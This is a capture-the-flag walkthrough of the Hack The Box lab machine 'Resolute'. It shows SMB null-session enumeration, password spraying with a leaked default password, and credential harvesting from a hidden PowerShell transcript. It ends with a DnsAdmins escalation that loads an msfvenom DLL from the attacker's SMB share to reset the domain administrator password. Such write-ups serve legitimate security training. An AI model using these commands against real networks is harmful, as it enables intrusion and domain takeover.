---
title: "HTB: Resolute"
date: 2023-11-12
draft: false
os: "Windows"
difficulty: "Medium"
platform: "HTB"
aliases: ["/posts/htb/resolute/"]
tags:
  - htb
  - medium
  - windows
  - active-directory
  - smb-null-session
  - password-spray
  - hidden-files
  - dnsadmins
  - dnscmd
categories:
  - walkthrough
---

{{< box-info name="Resolute" os="Windows" difficulty="Medium" ip="10.129.96.155" platform="HTB" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
```
{{< /collapse >}}

Domain: `megabank.local`, Windows Server 2016.

### SMB - Null Session

SMB allows null authentication and leaks the full user list via SAMRPC:

```bash
crackmapexec smb 10.129.96.155 -u '' -p '' --users
```

The goldmine is in the account descriptions -- someone left a default password in plain sight:

```
megabank.local\marko    Account created. Password set to Welcome123!
```

---

## Foothold

### Password Spray

`marko:Welcome123!` doesn't work -- the password was probably changed. But if that's the default password for new accounts, maybe someone else never changed theirs:

```bash
crackmapexec smb 10.129.96.155 -u user_list -p 'Welcome123!' --no-bruteforce

[+] megabank.local\melanie:Welcome123!
```

WinRM access as `melanie`.

---

## Lateral Movement

### Hidden PowerShell Transcript → ryan

Nothing obvious in melanie's profile. But searching for hidden files with `dir -force` reveals a PowerShell transcript directory:

```
C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

Inside the transcript, someone ran a `net use` command with credentials in the clear:

```
cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

Credentials: `ryan:Serv3r4Admin4cc123!` -- CME confirms he's admin-level.

---

## Privilege Escalation

### DnsAdmins → Domain Admin

Ryan is a member of the `DnsAdmins` group. This group can load arbitrary DLLs into the DNS service, which runs as SYSTEM.

A note on ryan's desktop warns that system changes revert within 1 minute, so we need to move fast.

Generate a DLL that resets the administrator password:

```bash
msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll
```

Host it over SMB to avoid touching disk (Defender would eat it):

```bash
sudo impacket-smbserver share ./
```

Load the DLL via `dnscmd` and restart the DNS service:

```powershell
cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.9\share\da.dll
sc.exe stop dns
sc.exe start dns
```

The DLL executes as SYSTEM, resetting the admin password. Log in with `evil-winrm` as Administrator.

---

## Proof

{{< terminal title="root@resolute" >}}
whoami
megabank\administrator
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- Always check account descriptions during SMB/LDAP enumeration -- credentials in comments are more common than you'd think
- When one user's default password doesn't work, spray it across all accounts
- Hidden files and PowerShell transcripts are high-value targets for credential harvesting (`dir -force` is your friend)
- DnsAdmins group membership is essentially a domain admin escalation path via DLL injection into the DNS service
{{< /callout >}}
